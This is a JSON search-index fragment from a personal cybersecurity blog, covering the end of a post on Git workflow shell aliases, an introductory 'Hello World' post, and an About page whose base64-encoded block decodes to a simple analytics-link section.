your shell configuration file (e.g., .bashrc or .zshrc): alias gitflow-branch=\"./.shell/github-branch.sh\" alias gitflow-deploy=\"./.shell/github-deploy\" alias gitflow-clean=\"./.shell/github-merged.sh\" Then simply run: gitflow-branch gitflow-deploy gitflow-clean ","date":"2025-05-12","objectID":"/posts/github/:4:4","tags":["Journey"],"title":"Github Workflow","uri":"/posts/github/#example-workflow"},{"categories":["Thoughts"],"collections":["Welcome"],"content":" “What wakes you up every morning is not the alarm clock, but your dreams.” I’ve lived through moments where this belief kept me going. I’ve seen the effort I’ve put into my work, and now, as I look back, the real question isn’t whether I’ve earned what I have — it’s about continuing to push forward, unflinching in the face of challenges. In cybersecurity, the fight is never over. It’s a world where the enemy never sleeps, and neither should we. From my early days in tech, grappling with complex algorithms and shifting to cybersecurity, the road has been long. I started with basic coding, moved to penetration testing, then switched to defensive security, teaching interns, and tackling real-world security problems. Every step has been driven by curiosity and the desire to defend what matters — our digital lives. Time doesn’t pause because we hesitate. Like you, there are countless others chasing their dreams. No one is born a cybersecurity expert, but each day is an opportunity to grow, to protect, and to evolve. Never be content with where you are; always strive to learn, to adapt, and to secure. I started this blog to share my journey — from early security challenges to tips on staying safe online. In the early days, I followed the guidance of mentors, learned from books, and coded through the night. The name “Securing the Digital World” was born from the countless hours spent defending what many people overlook: the safety of our digital lives. Here’s to the next chapter of cybersecurity, as we continue to evolve in a world where data is power, and protection is key. ","date":"2025-05-10","objectID":"/posts/hello-world/:0:0","tags":["Journey"],"title":"Hello World","uri":"/posts/hello-world/#"},{"categories":null,"collections":null,"content":" Stand firm when the world resists, but never surrender to yourself. — Personal Code ","date":"2025-05-08","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/#"},{"categories":null,"collections":null,"content":"Who Am I? “The quieter you become, the more you are able to hear.” — Rumi I’m ProxyGeek, a cybersecurity enthusiast and ethical hacker with a deep interest in offensive security, digital forensics, and capture-the-flag competitions. By day, I work on secure development and exploit analysis. By night, I explore reverse engineering, vulnerability research, and write-ups to share what I learn with the community. Cybersecurity Enginer Security \u0026 CTF Player Interests: Web exploitation, privilege escalation, binary exploitation, threat modeling Frequent player on Hack The Box, RootMe, TryHackMe and local CTFs Background in Computer Science \u0026 Security Engineering Strong belief in knowledge sharing \u0026 open-source collaboration GitHub: @ProxyGeek ","date":"2025-05-08","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/#who-am-i"},{"categories":null,"collections":null,"content":"About the Blog This space serves as a personal knowledge base and a digital lab notebook. You’ll find: CTF walkthroughs \u0026 methodology Write-ups on exploitation techniques Notes on real-world vulnerabilities \u0026 CVEs Cybersecurity tooling tips and custom scripts Philosophy, digital hygiene, and opsec mindset You can subscribe via GitHub. /** * \"A collection of strengths from all sources\" * Licensed under CC BY-NC-SA 4.0 * @since 2025-05-08 20:01:01 */ class Blog { constructor(title, creator, url) { this.title = title; this.creator = creator; this.url = url; } } // The purpose of this site is not to flaunt knowledge, but to record ignorance. const website = new Blog('A Collection of Strengths', 'ProxyGeek', 'https://proxygeek.blog'); History Official launch of this cybersecurity-focused blog. A space to share learning, experiments, and reflections. 2025-06-17Started working toward OffSec certifications to deepen technical skills and validate knowledge. 2025-05-10Started drafting write-ups on CTFs and security tooling. Idea for a blog took shape. 2025-04-12Began diving seriously into InfoSec and ethical hacking. Joined a few beginner-friendly CTFs. 2025-01-20 EnterPGgyIGNsYXNzPSJoZWFkaW5nLWVsZW1lbnQiIGl1b0ba2dd7bd98974ce28fce63kPSJkYXRhLWFuYWx5c2lzIj48c3Bhbj5EYXRhIEFuYWx5c2lzPC9zcGFuPgogIDxhIGhyZWY9IiNkYXRhLWFuYWx5c2lzIiBjbGFzcz0iaGVhZGluZy1tYXJrIj4KICAgIDxzdmcgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1saW5rIiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBoZWlnaHQ9IjE2IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PHBhdGggZD0ibTcuNzc1IDMuMjc1IDEuMjUtMS4yNWEzLjUgMy41IDAgMSAxIDQuOTUgNC45NWwtMi41IDIuNWEzLjUgMy41IDAgMCAxLTQuOTUgMCAuNzUxLjc1MSAwIDAgMSAuMDE4LTEuMDQyLjc1MS43NTEgMCAwIDEgMS4wNDItLjAxOCAxLjk5OCAxLjk5OCAwIDAgMCAyLjgzIDBsMi41LTIuNWEyLjAwMiAyLjAwMiAwIDAgMC0yLjgzLTIuODNsLTEuMjUgMS4yNWEuNzUxLjc1MSAwIDAgMS0xLjA0Mi0uMDE4Ljc1MS43NTEgMCAwIDEtLjAxOC0xLjA0MlptLTQuNjkgOS42NGExLjk5OCAxLjk5OCAwIDAgMCAyLjgzIDBsMS4yNS0xLjI1YS43NTEuNzUxIDAgMCAxIDEuMDQyLjAxOC43NTEuNzUxIDAgMCAxIC4wMTggMS4wNDJsLTEuMjUgMS4yNWEzLjUgMy41IDAgMSAxLTQuOTUtNC45NWwyLjUtMi41YTMuNSAzLjUgMCAwIDEgNC45NSAwIC43NTEuNzUxIDAgMCAxLS4wMTggMS4wNDIuNzUxLjc1MSAwIDAgMS0xLjA0Mi4wMTggMS45OTggMS45OTggMCAwIDAtMi44MyAwbC0yLjUgMi41YTEuOTk4IDEuOTk4IDAgMCAwIDAgMi44M1oiPjwvcGF0aD48L3N2Zz4KICA8L2E+CjwvaDI+PHVsPgo8bGk+PGEgaHJlZj0iaHR0cHM6Ly9jbG91ZC51bWFtaS5pcy9zaGFyZS80NUNUSnVpODJCcVU3UDE0L3ByMHh5ZzMzay5naXRodWIuaW8iIHRhcmdldD0iX2JsYW5rIiByZWw9ImV4dGVybmFsIG5vZm9sbG93IG5vb3BlbmVyIG5vcmVmZXJyZXIiPlVtYW1pPGkgY2xhc3M9ImZhLXNvbGlkIGZhLWV4dGVybmFsLWxpbmstYWx0IGZhLWZ3IGZhLXhzIG1zLTEgdGV4dC1zZWNvbmRhcnkiIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+PC9hPjwvbGk+CjwvdWw+CjwhLS0KLSBbVmVyY291bnRdKGh0dHBzOi8vdmVyY291bnQub25lL2Rhc2hib2FyZC9hbmFseXRpY3M/ZG9tYWluPVByMHh5RzMzay5naXRodWIuaW8pCi0tPgo= - views ","date":"2025-05-08","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/#about-the-blog"}]